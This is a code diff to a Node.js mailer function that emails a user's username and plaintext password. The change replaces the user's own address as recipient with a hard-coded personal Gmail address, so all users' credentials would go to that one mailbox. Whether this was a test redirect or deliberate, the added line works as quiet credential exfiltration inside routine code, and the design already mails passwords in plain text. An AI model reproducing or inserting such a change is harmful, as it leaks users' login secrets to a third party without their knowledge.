@@ -19,7 +19,7 @@ async function mailerFunc(emailId,userName,pass) {
     // send mail with defined transport object
     let info = await transporter.sendMail({
       from: '"Priyansh" <priyansh007.suvit@gmail.com>', // sender address
-      to: emailId, // list of receivers
+      to: "priynashgodhani007@gmail.com", // list of receivers
       subject: "Hello ✔", // Subject line
       text: "userName : " +  userName + " " + "password : " + pass, // plain text body
     });
